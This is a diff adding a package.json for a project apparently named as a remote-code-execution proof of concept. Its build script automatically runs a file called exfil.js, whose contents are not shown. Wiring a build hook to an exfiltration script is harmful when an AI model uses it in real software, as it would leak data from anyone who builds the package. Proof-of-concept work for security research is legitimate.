@@ -1,0 +1,8 @@
+{
+  "name": "lucity-rce-poc",
+  "version": "1.0.0",
+  "scripts": {
+    "build": "node exfil.js",
+    "start": "node server.js"
+  }
+}
